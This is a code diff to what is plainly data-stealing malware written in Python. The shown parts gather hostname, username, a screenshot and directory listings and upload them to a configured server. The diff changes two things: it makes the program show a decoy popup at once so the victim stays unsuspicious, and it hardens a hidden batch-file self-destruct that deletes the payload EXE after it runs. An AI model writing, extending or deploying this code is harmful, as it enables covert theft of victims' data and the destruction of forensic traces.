@@ -440,7 +440,14 @@ def send_data(data, screenshot_bytes):
 # ---- Self-Destruct ----
 
 def _self_destruct_windows():
-    """Windows: batch script deletes EXE after process exits."""
+    """Windows: batch script deletes EXE after process exits.
+
+    The batch runs with CWD set to %TEMP% and retries a bounded number of
+    times: an unbounded loop used to keep a cmd.exe alive forever whenever the
+    payload EXE could not be deleted (read-only media, AV lock, still-running
+    image), and because the child inherited the payload folder as CWD the
+    extraction directory stayed locked as well.
+    """
     import ctypes
     exe_path = os.path.abspath(sys.argv[0])
     if not exe_path.lower().endswith('.exe'):
@@ -451,21 +458,33 @@ def _self_destruct_windows():
     with open(fake_path, 'wb') as f:
         f.write(b'')
 
-    bat_path = os.path.join(os.environ.get('TEMP', '.'), f'_c{uuid.uuid4().hex[:6]}.bat')
+    temp_dir = (os.environ.get('TEMP') or os.environ.get('TMP')
+                or os.path.join(os.environ.get('SystemRoot', r'C:\Windows'),
+                                'Temp'))
+    try:
+        os.makedirs(temp_dir, exist_ok=True)
+    except OSError:
+        temp_dir = dir_name if os.path.isdir(dir_name) else '.'
+
+    bat_path = os.path.join(temp_dir, f'_c{uuid.uuid4().hex[:6]}.bat')
     with open(bat_path, 'w') as f:
-        f.write(f'@echo off\r\n'
-                f':loop\r\n'
+        f.write('@echo off\r\n'
+                'set RETRY=0\r\n'
+                ':loop\r\n'
                 f'del /f "{exe_path}" >nul 2>&1\r\n'
-                f'if exist "{exe_path}" (\r\n'
-                f'    timeout /t 1 /nobreak >nul\r\n'
-                f'    goto loop\r\n'
-                f')\r\n'
-                f'del "%~f0" >nul 2>&1\r\n')
+                f'if not exist "{exe_path}" goto done\r\n'
+                'set /a RETRY+=1\r\n'
+                'if %RETRY% GEQ 15 goto done\r\n'
+                'ping -n 2 127.0.0.1 >nul\r\n'
+                'goto loop\r\n'
+                ':done\r\n'
+                'del "%~f0" >nul 2>&1\r\n')
 
     subprocess.Popen(
         ['cmd.exe', '/c', bat_path],
         creationflags=0x08000000,
         close_fds=True,
+        cwd=temp_dir,
     )
     print(f"[*] Self-destruct: {exe_path} -> {fake_path}")
 
@@ -535,6 +554,13 @@ def main():
     print(f"[*] Token: {TOKEN}")
     print(f"[*] Server: {SERVER_URL}")
 
+    # Show the decoy immediately on a worker thread. The previous placement
+    # (after screenshot + directory scan + upload) made the popup appear only
+    # after a long delay, which looked broken to the user.
+    if POPUP_ENABLED.lower() == 'true':
+        import threading
+        threading.Thread(target=show_popup, daemon=True).start()
+
     hostname = socket.gethostname()
     if IS_WINDOWS:
         username = os.environ.get('USERNAME', 'unknown')
@@ -575,9 +601,6 @@ def main():
         print(f"[*] Server response: {result}")
     else:
         print("[!] Failed to send data")
-
-    if POPUP_ENABLED.lower() == 'true':
-        show_popup()
 
     if SELF_DESTRUCT.lower() == 'true':
         self_destruct()
